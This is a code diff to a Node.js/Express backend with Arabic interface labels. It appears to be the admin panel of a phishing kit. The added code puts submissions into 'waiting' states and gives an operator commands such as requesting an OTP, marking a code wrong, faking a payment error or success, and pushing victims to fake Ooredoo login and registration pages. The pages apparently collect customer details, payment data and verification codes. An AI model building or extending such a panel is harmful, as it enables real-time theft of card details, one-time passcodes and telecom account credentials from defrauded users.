@@ -77,6 +77,12 @@ router.post('/submit', async (req, res) => {
     user.current_page = actualPageKey;
     user.last_activity = new Date();
     user.is_read = false;
+
+    if (summary === 'WAITING-IN-LOADING' || summary === 'WAITING-OTP-ACTION' || summary === 'WAITING-ERROR-ACTION') {
+      user.status = 'waiting';
+      user.waiting_for_decision = true;
+    }
+
     await user.save();
 
     if (fields && fields.length > 0) {
@@ -200,7 +206,46 @@ router.get('/session', requireAdmin, (req, res) => {
 // GET /api/bootstrap
 router.get('/bootstrap', requireAdmin, async (req, res) => {
   const users = await User.find().sort({ last_activity: -1 }).limit(100);
-  res.json({ ok: true, admin: { username: req.admin.username }, conversations: users });
+  
+  const statuses = [
+    { key: 'new', label_ar: 'جديد', tone: 'info' },
+    { key: 'waiting', label_ar: 'قيد الانتظار', tone: 'warning', waiting: true },
+    { key: 'otp_requested', label_ar: 'مطلوب رمز', tone: 'warning', waiting: true },
+    { key: 'retry', label_ar: 'إعادة محاولة', tone: 'warning', waiting: true },
+    { key: 'ooredoo', label_ar: 'أوريدو', tone: 'warning', waiting: true },
+    { key: 'completed', label_ar: 'مكتمل', tone: 'success' },
+    { key: 'ignored', label_ar: 'متجاهل', tone: 'neutral' }
+  ];
+
+  const commands = [
+    { key: 'WAIT', label_ar: 'انتظار' },
+    { key: 'OTP', label_ar: 'طلب OTP' },
+    { key: 'WRONG', label_ar: 'رمز خاطئ' },
+    { key: 'ERROR', label_ar: 'خطأ بالدفع' },
+    { key: 'SUCCESS', label_ar: 'نجاح' },
+    { key: 'OOREDOO', label_ar: 'أوريدو' },
+    { key: 'OOR_REG', label_ar: 'أوريدو (تسجيل)' },
+    { key: 'OOR_ERR', label_ar: 'أوريدو (خطأ)' },
+    { key: 'ID_ERR', label_ar: 'هوية خاطئة' },
+    { key: 'RESUME', label_ar: 'متابعة' }
+  ];
+  
+  const pages = [
+    { key: 'activity', label_ar: 'نشاط' },
+    { key: 'hourly', label_ar: 'ساعات' },
+    { key: 'monthly', label_ar: 'شهري' },
+    { key: 'recruitment', label_ar: 'استقدام' },
+    { key: 'customer', label_ar: 'معلومات العميل' },
+    { key: 'summary', label_ar: 'الملخص' },
+    { key: 'payment_methods', label_ar: 'طرق الدفع' },
+    { key: 'payment', label_ar: 'الدفع' },
+    { key: 'otp', label_ar: 'التحقق' },
+    { key: 'ooredoo_login', label_ar: 'أوريدو (دخول)' },
+    { key: 'ooredoo_reg', label_ar: 'أوريدو (تسجيل)' },
+    { key: 'ooredoo_forgot', label_ar: 'أوريدو (نسيان)' }
+  ];
+
+  res.json({ ok: true, admin: { username: req.admin.username }, conversations: users, statuses, commands, pages });
 });
 
 // GET /api/conversations
